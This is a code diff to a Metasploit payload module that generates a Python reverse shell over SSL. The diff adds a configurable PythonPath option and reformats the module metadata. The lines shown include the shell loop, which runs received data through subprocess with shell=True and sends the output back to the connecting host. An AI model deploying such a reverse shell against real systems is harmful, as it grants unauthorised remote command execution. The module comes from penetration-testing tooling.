@@ -14,22 +14,27 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Unix Command Shell, Reverse TCP SSL (via python)',
-      'Description'   => 'Creates an interactive shell via python, uses SSL, encodes with base64 by design.',
-      'Author'        => 'RageLtMan <rageltman[at]sempervictus>',
-      'License'       => BSD_LICENSE,
-      'Platform'      => 'unix',
-      'Arch'          => ARCH_CMD,
-      'Handler'       => Msf::Handler::ReverseTcpSsl,
-      'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'cmd',
-      'RequiredCmd'   => 'python',
-      'Payload'       =>
-        {
-          'Offsets' => { },
-          'Payload' => ''
-        }
-      ))
+     'Name'          => 'Unix Command Shell, Reverse TCP SSL (via python)',
+     'Description'   => 'Creates an interactive shell via python, uses SSL, encodes with base64 by design.',
+     'Author'        => 'RageLtMan <rageltman[at]sempervictus>',
+     'License'       => BSD_LICENSE,
+     'Platform'      => 'unix',
+     'Arch'          => ARCH_CMD,
+     'Handler'       => Msf::Handler::ReverseTcpSsl,
+     'Session'       => Msf::Sessions::CommandShell,
+     'PayloadType'   => 'cmd',
+     'RequiredCmd'   => 'python',
+     'Payload'       =>
+       {
+         'Offsets' => { },
+         'Payload' => ''
+       }
+    ))
+    register_advanced_options(
+      [
+        OptString.new('PythonPath', [true, 'The path to the Python executable', 'python'])
+      ]
+    )
   end
 
   #
@@ -59,6 +64,6 @@ module MetasploitModule
     cmd += "\tproc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)\n"
     cmd += "\tstdout_value=proc.stdout.read() + proc.stderr.read()\n"
     cmd += "\ts.send(stdout_value)\n"
-    "python -c \"#{ py_create_exec_stub(cmd) }\""
+    "#{datastore['PythonPath']} -c \"#{ py_create_exec_stub(cmd) }\""
   end
 end
